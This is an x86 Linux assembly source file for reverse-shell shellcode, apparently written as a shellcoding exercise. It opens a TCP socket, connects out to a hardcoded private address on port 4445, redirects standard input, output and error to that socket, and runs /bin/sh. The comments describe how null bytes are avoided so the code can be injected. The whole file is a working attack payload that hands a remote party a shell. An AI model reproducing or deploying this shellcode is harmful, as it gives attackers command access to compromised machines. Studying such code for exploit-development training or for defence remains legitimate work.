;Author: Ymir F. Eboras
;SHELL_REVERSE_TCP


global _start

section .text

_start:


socket: 

	;push AF_INET(2), SOCK_STREAM(1), IP_TCP(6) to the stack in reverse order

	push byte 0x6		;push IP_TCP
	push byte 0x1		;push SOCK_STREAM
	push byte 0x2		;push AF_INET


	xor eax, eax		;remove x00/NULL byte
	mov al, 0x66		;syscall 102 for socketcall
	xor ebx, ebx		;remove x00/NULL byte
	mov bl, 0x1		;net.h SYS_SOCKET 1 (0x1)
	xor ecx, ecx		;remove x00/NULL byte
	mov ecx, esp		;arg to SYS_SOCKET
	int 0x80		;interrupt/execute


	mov edi, eax		;sockfd, store return value of eax into edi

reverse_jump:

	jmp short reverse_ip_port


connect:
	
	;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);

	
	pop esi			;pops port+IP (total of 6 bytes), ESP addr to esi register
	xor eax, eax		;removes x00/NULL byte
	xor ecx, ecx		;removes x00/NULL byte
	push dword[esi]		;push IP (first 4 bytes of esi)
	push word[esi +4]	;push PORT (last 2 bytes of esi)
	mov al, 0x2		;AF_INET IPV4
	push ax			
	mov eax, esp		;store stack address into edc (struct sockaddr)
	push 0x10		;store length addr on stack
	push eax		;push struct sockaddr to the stack
	push edi		;sockfd from th eax _start
	xor eax, eax		;removes x00/NULL byte
	mov al, 0x66		;syscall 102 for socketcall
	xor ebx, ebx		;removes x00/NULL byte
	mov bl, 0x03		;net.h SYS_CONNECT 3
	mov ecx, esp		;arg for SYS_CONNECT
	int 0x80

change_fd:

        ;multiple dup2() in order to ensure that std in, std out, std error will
        ;go through the socket connection

        xor ecx, ecx            ;removes 0x00/NULL byte, 0 (std in)
        xor eax, eax            ;removes 0x00/NULL byte
	xor ebx, ebx		;removes 0x00/NULL byte
	mov ebx, edi		;sockfd from the eax _start
        mov al, 0x3f            ;syscall 63 for dup2
        int 0x80                ;interrupt/execute

        mov al, 0x3f            ;syscall 63 for dup2
        inc ecx                 ;+1 to cx, 1 (std out)
        int 0x80                ;interrupt/execute

        mov al, 0x3f            ;syscall 63 for dup2
        inc ecx                 ;+1 to ecx, 2 (std error)
        int 0x80                ;interrupt/execute


execve:
	xor eax, eax            ; removes x00/NULL byte
        push eax                ; push first null dword

        push 0x68732f2f         ;hs//
        push 0x6e69622f         ;nib/

        mov ebx, esp            ; save stack pointer in ebx

        push eax                ; push null byte terminator
        mov edx, esp            ; moves address of 0x00hs//nib/ into ecx

        push ebx
        mov ecx, esp

        mov al, 0xb             ; syscall 11 for execve
        int 0x80


reverse_ip_port:
	
	call connect

	reverse_ip dd 0x82c7a8c0			; 192.168.199.130
	reverse_port dw 0x5d11				; port 4445 
